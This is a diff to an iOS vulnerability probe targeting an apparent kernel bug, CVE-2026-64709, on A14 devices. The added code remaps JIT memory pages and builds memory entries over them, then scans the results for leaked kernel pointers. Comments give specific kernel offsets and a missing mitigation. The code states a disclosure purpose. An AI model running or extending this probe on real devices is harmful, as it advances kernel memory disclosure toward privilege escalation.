@@ -12513,7 +12513,8 @@ static int p005_scan_kptrs(uint8_t *buf, size_t len, const char *tag, NSMutableS
         uint64_t v; memcpy(&v, buf + i, 8);
         if (v != 0x4141414141414141ULL) nonmarker++;
         if ((v >= 0xffffffe000000000ULL && v <= 0xffffffffffffffffULL) ||
-            (v >= 0xfffffff000000000ULL && v <= 0xfffffeffffffffffULL)) {
+            (v >= 0xfffffff000000000ULL && v <= 0xfffffeffffffffffULL) ||
+            (v >= 0xffffff8000000000ULL && v < 0xffffffe000000000ULL)) {
             if (hits < 24) {
                 [out appendFormat:@"    [%s] +0x%zx: 0x%016llx\n", tag, i, (unsigned long long)v];
             }
@@ -12571,7 +12572,7 @@ static void p005_try_mementry(NSMutableString *out, int logfd, mach_port_t selft
 + (NSString *)runP005Probe {
     NSMutableString *out = [NSMutableString string];
     [out appendFormat:@"time %@\n", [NSDate date]];
-    [out appendString:@"=== P005 v3 CVE-2026-64709 watch (A14 23F77) ===\n"];
+    [out appendString:@"=== P005 v4 CVE-2026-64709 watch (A14 23F77) ===\n"];
     [out appendString:@"Candidate: vm_map_remap of a JIT entry (bit22 @ entry+0x38).\n"];
     [out appendString:@"copyout_internal 0xfffffff009ed4310 already masks +0x38 with 0xffbfddff if bit22.\n"];
     [out appendString:@"26.6 adds the SAME idea on remap + log. 23F77 remap has NO bit22 downgrade.\n"];
@@ -12583,7 +12584,7 @@ static void p005_try_mementry(NSMutableString *out, int logfd, mach_port_t selft
     int logfd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
     #define P005LOG(...) do { if (logfd >= 0) { char _lb[256]; int _n = snprintf(_lb, sizeof(_lb), __VA_ARGS__); write(logfd, _lb, _n); fcntl(logfd, F_FULLFSYNC); } } while (0)
     [out appendFormat:@"logfile: %s (fd=%d)\n\n", [lp UTF8String], logfd];
-    P005LOG("START p005-probe-v3 A14\n");
+    P005LOG("START p005-probe-v4 A14\n");
 
     {
         [out appendString:@"--- signed entitlements (what AMFI actually sees) ---\n"];
@@ -12658,6 +12659,28 @@ static void p005_try_mementry(NSMutableString *out, int logfd, mach_port_t selft
             } else {
                 [out appendFormat:@"[mmap MAP_JIT %s] remap kr=0x%x\n", maps[mi].name, kr];
             }
+            // v4 lane A: remap COPY=TRUE (vm_map_copyout path - the one 26.6 masks).
+            {
+                vm_address_t dstc = 0; vm_prot_t curp2, maxp2;
+                kern_return_t kr2 = mach_vm_remap(selftask, &dstc, SZ, 0, VM_FLAGS_ANYWHERE,
+                                                  selftask, (mach_vm_address_t)(uintptr_t)p, TRUE,
+                                                  &curp2, &maxp2, VM_INHERIT_DEFAULT);
+                if (kr2 == KERN_SUCCESS && dstc) {
+                    int nmc = 0;
+                    int hc = p005_scan_kptrs((uint8_t*)dstc, SZ, "mmapJIT.remapCOPY", out, &nmc);
+                    [out appendFormat:@"[mmap MAP_JIT %s] remapCOPY dst=0x%lx kptr=%d foreign_qw=%d\n",
+                        maps[mi].name, (unsigned long)dstc, hc, nmc];
+                    if (hc) { total_kptr_hits += hc; P005LOG("HIT mmapJIT remapCOPY hits=%d\n", hc); }
+                    vm_deallocate(selftask, dstc, SZ);
+                } else {
+                    [out appendFormat:@"[mmap MAP_JIT %s] remapCOPY kr=0x%x\n", maps[mi].name, kr2];
+                    P005LOG("v4 mmapJIT remapCOPY kr=0x%x\n", kr2);
+                }
+            }
+            // v4 lane B: memory ENTRY over the REAL JIT page (R/RW/RWX).
+            p005_try_mementry(out, logfd, selftask, (vm_address_t)(uintptr_t)p, SZ, "mmapJIT", 90 + mi, VM_PROT_READ, &total_kptr_hits);
+            p005_try_mementry(out, logfd, selftask, (vm_address_t)(uintptr_t)p, SZ, "mmapJIT", 90 + mi, VM_PROT_READ|VM_PROT_WRITE, &total_kptr_hits);
+            p005_try_mementry(out, logfd, selftask, (vm_address_t)(uintptr_t)p, SZ, "mmapJIT", 90 + mi, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE, &total_kptr_hits);
             munmap(p, SZ);
             [out appendFormat:@"[mmap MAP_JIT %s] allocate OK\n", maps[mi].name];
             P005LOG("mmapJIT %s alloc OK\n", maps[mi].name);
@@ -12758,7 +12781,7 @@ static void p005_try_mementry(NSMutableString *out, int logfd, mach_port_t selft
     [out appendFormat:@"map_jit_reachable=%d total_kptr_hits=%d\n", map_jit_ok, total_kptr_hits];
     if (total_kptr_hits == 0) {
         if (!map_jit_ok) {
-            [out appendString:@"0 kptr + no MAP_JIT: NOT a 64709 test. Need allow-jit or bit0x16 path.\n"];
+            [out appendString:@"0 kptr + no MAP_JIT: NOT a 64709 test. Grant JIT (StikDebug/LC debugger lane) and re-tap.\n"];
             [out appendString:@"0 hits on plain 0x41 pages is expected. Inconclusive, not neg control.\n"];
         } else {
             [out appendString:@"MAP_JIT reachable but 0 kptr: interesting — paste full log.\n"];
@@ -12767,7 +12790,7 @@ static void p005_try_mementry(NSMutableString *out, int logfd, mach_port_t selft
     } else {
         [out appendFormat:@"*** %d KERNEL-POINTER HITS *** — paste full log. Companion-disclose, not KRW.\n", total_kptr_hits];
     }
-    P005LOG("SURVIVED p005-v2 total_hits=%d jit=%d\n", total_kptr_hits, map_jit_ok);
+    P005LOG("SURVIVED p005-v4 total_hits=%d jit=%d\n", total_kptr_hits, map_jit_ok);
     if (logfd >= 0) close(logfd);
     [out appendString:@"\nDONE -- paste this text back\n"];
     return out;
